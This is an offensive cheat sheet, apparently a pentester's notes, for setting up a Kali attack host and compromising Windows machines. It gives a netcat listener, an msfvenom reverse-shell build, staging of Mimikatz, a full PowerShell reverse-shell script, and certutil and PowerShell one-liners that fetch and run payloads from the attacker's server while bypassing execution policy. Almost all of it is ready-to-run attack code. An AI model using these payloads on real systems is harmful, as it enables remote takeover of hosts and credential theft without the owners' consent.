# Setup Kali for connections

## Setup listener

```console
nc -nlvp 4444
```

- `-n` : numeric-only IP addresses, no DNS
- `-l` : listen mode, for inbound connects
- `-v` : verbose [use twice to be more verbose]
- `-p` : local port number (port numbers can be individual or ranges: lo-hi [inclusive])

## Prepare payload transfer

### Setup web server

```console
systemctl start apache2
systemctl status apache2
```

### Prepare files to web server root

#### Mimikatz:

```console
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe /var/www/html
```

#### Windows reverse shell TCP:

```console
msfvenom -p windows/x64/shell_reverse_tcp LHOST=kali.vx LPORT=4444 -f exe -o /var/www/html/reverse.exe
```

#### PowerShell-based reverse shell script:

`vi /var/www/html/reverse.ps1` with below code:

```console
$ADDRESS='kali.vx'
$PORT=4444
$CLIENT = New-Object System.Net.Sockets.TCPClient($ADDRESS,$PORT)
$STREAM = $CLIENT.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $STREAM.Read($bytes, 0, $bytes.Length)) -ne 0)
{
$DATA = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
$SENDBACK = (iex $DATA 2>&1 | Out-String )
$SENDBACK2 = $sendback + 'PS ' + (pwd).Path + '> '
$SENDBYTE = ([text.encoding]::ASCII).GetBytes($SENDBACK2)
$STREAM.Write($SENDBYTE,0,$SENDBYTE.Length)
$STREAM.Flush()
}
$CLIENT.Close()
```

# Execute payloads on Windows

## Execute Windows reverse shell TCP

### Using certutil

```console
certutil.exe /urlcache /f /split http://kali.vx/reverse.exe %USERPROFILE%\reverse.exe && %USERPROFILE%\reverse.exe
```

### Using PowerShell

```console
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://kali.vx/reverse.exe','%USERPROFILE%\reverse.exe'); Start-Process %USERPROFILE%\reverse.exe
```

## Execute PowerShell-based reverse shell script

☝️ `Invoke-Expression` is useful if you don't want the payload to touch the disk, but it works for Powershell Scripts only

(i.e. `DownloadFile` of the reverse shell executable and try to run it with `Invoke-Expression` will not work)

```console
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://kali.vx/reverse.ps1')
```
